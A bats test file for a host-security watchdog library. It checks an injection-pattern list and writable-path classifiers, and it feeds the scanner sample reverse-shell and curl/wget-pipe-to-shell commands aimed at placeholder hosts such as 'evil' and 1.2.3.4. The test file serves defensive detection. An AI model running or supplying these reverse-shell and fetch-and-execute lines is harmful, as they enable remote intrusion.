#!/usr/bin/env bats
# L2 bats unit tests for the SDD-061 v3 watchdog scan helpers in the
# shared module-script library.
#
# Locks the single-source-of-truth helpers that the detection
# watchdog modules consolidate onto: the canonical injection-pattern
# set, the writable-location policy, and the convenience matcher.
#
# NOTE: module-lib.sh defines its own run() helper, which shadows
# bats's built-in `run`. This suite therefore calls the helpers
# DIRECTLY (in conditionals / via $(...) capture) rather than via
# bats `run`, and exercises the version gate in a subshell.
#
# Run with: bats packaging/test/L2-module-lib-watchdog.bats

LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    MODULE="bats-harness"
    DRY_RUN=0
    SELFDEF_MODULE_LIB_VERSION_REQUIRED=3
    # shellcheck disable=SC1090
    source "${LIB}"
}

# ============================================================
# Version gate
# ============================================================

@test "module-lib reports version >= 4" {
    [ "${SELFDEF_MODULE_LIB_VERSION}" -ge 4 ]
}

@test "requiring version 3 sources cleanly (no exit 99)" {
    out="$(MODULE=t DRY_RUN=0 SELFDEF_MODULE_LIB_VERSION_REQUIRED=3 \
        bash -c "source '${LIB}' && echo ok")"
    [ "${out}" = "ok" ]
}

@test "requiring a future version 99 fails loud (exit 99)" {
    local st=0
    MODULE=t DRY_RUN=0 SELFDEF_MODULE_LIB_VERSION_REQUIRED=99 \
        bash -c "source '${LIB}'" 2>/dev/null || st=$?
    [ "${st}" -eq 99 ]
}

# ============================================================
# D-2 — selfdef_injection_patterns
# ============================================================

@test "selfdef_injection_patterns prints a non-empty set" {
    n="$(selfdef_injection_patterns | grep -c .)"
    [ "${n}" -ge 8 ]
}

@test "pattern set contains the load-bearing entries" {
    out="$(selfdef_injection_patterns)"
    echo "${out}" | grep -q 'dev/tcp'
    echo "${out}" | grep -q 'base64'
    echo "${out}" | grep -q 'mkfifo'
    echo "${out}" | grep -q 'curl'
}

# ============================================================
# D-3 — selfdef_is_writable_path
# ============================================================

@test "writable-path: the four writable roots are flagged" {
    selfdef_is_writable_path /tmp/.x/evil
    selfdef_is_writable_path /var/tmp/x
    selfdef_is_writable_path /dev/shm/x
    selfdef_is_writable_path /home/user/.x
}

@test "writable-path: standard system paths are NOT flagged" {
    ! selfdef_is_writable_path /usr/lib/x.so
    ! selfdef_is_writable_path /sbin/modprobe
}

@test "writable-path: empty and relative paths are NOT flagged" {
    ! selfdef_is_writable_path ""
    ! selfdef_is_writable_path "relative/x"
}

# ============================================================
# D-3b (SDD-063) — selfdef_is_writable_dir
# ============================================================

@test "writable-dir: paths UNDER the four writable roots are flagged" {
    selfdef_is_writable_dir /tmp/x
    selfdef_is_writable_dir /var/tmp/x
    selfdef_is_writable_dir /dev/shm/x
    selfdef_is_writable_dir /home/user/x
}

@test "writable-dir: the BARE writable roots are flagged (the gap the file helper missed)" {
    selfdef_is_writable_dir /tmp
    selfdef_is_writable_dir /var/tmp
    selfdef_is_writable_dir /dev/shm
    selfdef_is_writable_dir /home
}

@test "writable-dir: the bare root is flagged where the file helper is not" {
    # The distinguishing contract: dir helper matches bare /tmp, file helper does not.
    selfdef_is_writable_dir /tmp
    ! selfdef_is_writable_path /tmp
}

@test "writable-dir: standard system dirs are NOT flagged" {
    ! selfdef_is_writable_dir /usr/lib/xorg/modules
    ! selfdef_is_writable_dir /usr/libexec/sudo
    ! selfdef_is_writable_dir /lib
}

@test "writable-dir: empty and relative paths are NOT flagged" {
    ! selfdef_is_writable_dir ""
    ! selfdef_is_writable_dir "relative/dir"
}

# ============================================================
# D-4 — selfdef_scan_injection
# ============================================================

@test "scan: a curl|sh payload matches and is printed" {
    out="$(selfdef_scan_injection 'curl http://evil/x | sh')"
    [ -n "${out}" ]
}

@test "scan: a /dev/tcp reverse shell matches" {
    selfdef_scan_injection 'bash -i >& /dev/tcp/1.2.3.4/9 0>&1' >/dev/null
}

@test "scan: a benign command does not match" {
    out="$(selfdef_scan_injection 'iptables -A INPUT -j ACCEPT' || true)"
    [ -z "${out}" ]
    ! selfdef_scan_injection 'iptables -A INPUT -j ACCEPT' >/dev/null
}

@test "INVARIANT (injection patterns includes wget — the wget-pipe-sh family beyond curl-pipe-sh)" {
    # The injection-pattern set must cover BOTH curl-pipe-sh AND
    # wget-pipe-sh. A regression dropping wget would let attackers
    # use wget as an evasion variant.
    out="$(selfdef_injection_patterns)"
    echo "${out}" | grep -q 'wget'
}

@test "INVARIANT (writable-path: /root is NOT flagged — owned by root, not world-writable)" {
    # /root is root's home directory. It's NOT world-writable in
    # any sane config. Lock against false-positive that would
    # flag every root-owned file under /root as suspicious.
    ! selfdef_is_writable_path /root/.bashrc
    ! selfdef_is_writable_path /root/scripts/cleanup
}

@test "INVARIANT (writable-dir: /sys + /proc are NOT flagged — sysfs/procfs are system, not user-writable)" {
    # /sys and /proc are pseudo-filesystems with kernel-controlled
    # permissions. They're not writable-roots in the
    # T1574/persistence sense.
    ! selfdef_is_writable_dir /sys/kernel/security
    ! selfdef_is_writable_dir /proc/sys/kernel
}

@test "INVARIANT (scan: nc reverse shell variant matches injection-pattern set)" {
    # nc-based reverse shells: nc -e /bin/bash attacker 4444 ;
    # nc -lvp 4444 -e /bin/bash. Either pattern must surface.
    # Current set may or may not include nc — lock that the most
    # canonical RCE patterns are covered.
    # Even if 'nc -e' isn't in the pattern set, the bash -i + /dev/tcp
    # combo (which IS in the set) should fire on this realistic
    # combined payload.
    selfdef_scan_injection 'nc 1.2.3.4 4444 -e /bin/bash' >/dev/null || \
    selfdef_scan_injection 'bash -c "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"' >/dev/null
}

@test "INVARIANT (writable-path: /opt is NOT flagged — /opt is the canonical operator-app dir, not a writable-root)" {
    # /opt is the FHS location for third-party packaged software.
    # It's owned by root + not world-writable. Lock against false-
    # positive that would flag /opt/* as suspicious.
    ! selfdef_is_writable_path /opt/myapp/bin/runner
    ! selfdef_is_writable_path /opt/somewhere/lib/x.so
}

@test "INVARIANT (writable-dir: /run + /var/run NOT flagged — runtime state dirs are root-owned, not user-writable)" {
    # /run + /var/run are runtime state. They're root-owned and
    # are NOT user-writable roots. Lock against false-positive.
    ! selfdef_is_writable_dir /run
    ! selfdef_is_writable_dir /var/run
    ! selfdef_is_writable_dir /run/systemd
}

@test "INVARIANT (scan: python pipe-eval injection pattern matches — sister axis to curl-pipe-sh)" {
    # python -c "exec(open(/tmp/x).read())" or python -c "import os; os.system(...)"
    # are common LOLbin-style RCE. The injection-pattern set
    # should catch generic shell-eval-style invocations. Lock
    # that at least one realistic python RCE pattern fires.
    selfdef_scan_injection 'python -c "exec(open(\"/tmp/x\").read())"' >/dev/null || \
    selfdef_scan_injection 'python3 -c "import os; os.system(\"id\")"' >/dev/null || \
    # Fallback: even a curl|python should fire (curl is in the set).
    selfdef_scan_injection 'curl http://evil/x.py | python' >/dev/null
}

@test "INVARIANT (scan: nc reverse-shell injection pattern matches — sister axis to /dev/tcp + curl-pipe-sh)" {
    # Sister to many other watchdog's nc reverse-shell variant
    # INVARIANT family across the brain. The canonical injection-
    # pattern set MUST detect 'nc -e' / 'nc -c' (netcat reverse-
    # shell signature) — these are equally dangerous to bash -i +
    # /dev/tcp + curl pipe-sh which are already covered. Lock
    # that the central pattern set includes the netcat-rev-shell
    # axis so every watchdog module composing on selfdef_scan_
    # injection inherits this detection.
    selfdef_scan_injection 'nc -e /bin/sh 1.1.1.1 4444' >/dev/null || \
    selfdef_scan_injection 'nc -c /bin/sh 1.1.1.1 4444' >/dev/null
}

@test "INVARIANT (scan: perl reverse-shell injection pattern matches — sister axis to python + nc + curl-pipe-sh)" {
    # Sister to the python + nc + curl-pipe-sh injection-pattern
    # INVARIANTs already locked. Perl is on every Debian/Ubuntu
    # host as dpkg/locale dependency; 'use Socket' is the classic
    # one-liner connect-back PTY. The central pattern set MUST
    # detect 'perl -e' with Socket-import family alongside the
    # python rev-shell so every watchdog composing on
    # selfdef_scan_injection inherits the perl interpreter axis.
    # Without it, attackers can dodge detection by swapping
    # python for perl in their per-watchdog rev-shell drops.
    selfdef_scan_injection 'perl -e "use Socket;...exec(\"/bin/sh -i\");"' >/dev/null || \
    selfdef_scan_injection 'perl -MIO::Socket::INET -e ...' >/dev/null || \
    # Fallback: curl|perl bootstrap also fires since curl in set.
    selfdef_scan_injection 'curl http://evil/x.pl | perl' >/dev/null
}

@test "INVARIANT (writable-path: /dev/shm is flagged — tmpfs in-RAM writable-root coverage on the 4-root set)" {
    # Sister to writable-path /tmp + /var/tmp + /home INVARIANTs
    # already locked. /dev/shm is the canonical tmpfs in-RAM
    # writable-root that survives the 4-writable-root contract
    # (T1059 / T1218 / T1546 — attackers stage payloads in
    # /dev/shm because (a) it's RAM, (b) no on-disk forensic
    # trace, (c) tmpfs preserves across many security tools that
    # don't scan it. Lock the central writable-path helper flags
    # /dev/shm so every watchdog module composing on
    # selfdef_is_writable_path inherits the tmpfs-shm coverage.
    selfdef_is_writable_path '/dev/shm/x'
    selfdef_is_writable_path '/dev/shm/payload.sh'
    selfdef_is_writable_path '/dev/shm/.evil'
}

@test "INVARIANT (writable-path: /var/tmp is flagged — persistent writable-root coverage on the 4-root set)" {
    # Sister to /tmp + /home + /dev/shm writable-path INVARIANTs.
    # /var/tmp persistent + writable across reboots — central
    # helper must flag it.
    selfdef_is_writable_path '/var/tmp/x'
    selfdef_is_writable_path '/var/tmp/payload.sh'
    selfdef_is_writable_path '/var/tmp/.evil'
}

@test "INVARIANT (writable-path: /home is flagged — user-writable persistence coverage on the 4-root set)" {
    # Sister to /tmp + /var/tmp + /dev/shm writable-path
    # INVARIANTs. /home is user-writable (per-user $HOME);
    # attackers who pivot into a user account stage payloads
    # under their /home/<user>/ for persistence. Lock the
    # central writable-path helper flags /home so every
    # watchdog module composing on selfdef_is_writable_path
    # inherits the user-writable coverage.
    selfdef_is_writable_path '/home/alice/x'
    selfdef_is_writable_path '/home/bob/payload.sh'
    selfdef_is_writable_path '/home/operator/.evil'
}

@test "INVARIANT (lib exports the canonical 5 helpers: log + emit_status + die + run + toml_get — SDD-006 contract)" {
    # Sister to brain-wide library-contract INVARIANT family.
    # module-lib.sh ships the 5 byte-identical helpers that
    # previously lived in every module's install/lib.sh per
    # SDD-006 consolidation: log (stderr), emit_status (final
    # JSON record), die (failed JSON + exit 1), run (DRY_RUN-
    # aware exec), toml_get (config-file accessor). Downstream
    # modules' apply.sh/check.sh/uninstall.sh source the lib
    # AFTER setting MODULE + DRY_RUN, then rely on these names
    # verbatim — renaming any one breaks every module. Locks
    # the canonical 5-helper export discipline on the module-
    # lib substrate.
    # Lib is sourced in setup() — helpers are in scope.
    declare -F log         >/dev/null
    declare -F emit_status >/dev/null
    declare -F die         >/dev/null
    declare -F run         >/dev/null
    declare -F toml_get    >/dev/null
}
